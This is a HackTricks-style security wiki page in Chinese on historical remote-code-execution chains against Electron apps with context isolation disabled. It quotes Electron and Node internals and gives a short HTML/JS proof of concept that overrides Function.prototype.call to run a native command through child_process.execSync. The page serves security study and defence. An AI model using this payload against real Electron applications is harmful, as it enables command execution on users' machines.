# 通过 Electron 内部代码实现 context-isolation RCE

{{#include ../../banners/hacktricks-training.md}}

以下是针对未启用 context isolation、且运行不可信 renderer 内容的 Electron 应用的**历史利用模式**。自 Electron 12 起，context isolation 默认启用，并且仍是推荐的安全设置。<sup>[[1]](#references)</sup> Electron 和 Node.js 版本不同，具体内部实现也会不同，因此应针对目标应用打包的版本复现利用链。

## 示例 1：覆盖 `Function.prototype.call`

此示例来自 Masato Kinugawa 在 CureCon 上的演讲。<sup>[[2]](#references)</sup>

在受影响的历史版本 Electron 中，内部 ASAR 代码注册了一个 process `exit` 监听器。由于禁用 context isolation 时，页面代码和 Electron 内部代码共享 JavaScript 原型，renderer 代码可以在内部监听器运行前替换 `Function.prototype.call`。<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Electron contextIsolation RCE 示例中使用的 asar.js 内部代码路径](<../../images/image (1070).png>)

该监听器通过 Node.js 的事件机制进行分发。原页面链接到了过时的 `bin/events.js` 路径；同一历史提交中的实际源代码位于 `lib/events.js`。<sup>[[5]](#references)</sup>

![Electron contextIsolation RCE 链中到达的 Node events.js 代码路径](<../../images/image (793).png>)

在此路径中，`self` 是 Node.js 的 process 对象：

![通过 Electron 内部代码实现 Electron contextIsolation RCE - 示例 1：`self` 是 Node 的 process 对象](<../../images/image (700).png>)

历史版本的 process 对象提供了通往 `require` 的路径：

```
process.mainModule.require
```

由于 listener dispatcher 使用 process 对象调用了处理程序，因此覆盖 `call` 可以获取该对象并执行原生命令：

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## 示例 2：prototype pollution

ElectroVolt 演讲展示了另一条历史利用链，通过 prototype pollution 获取 `require` 对象。<sup>[[4]](#references)</sup>

Leak：

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit：

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron 文档 - Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron：滥用缺乏 context isolation 的问题 - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electron 历史源码 - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt：攻陷热门桌面应用，同时发现 Electron 的新攻击面](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.js 历史源码 - `lib/events.js` 监听器分发](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
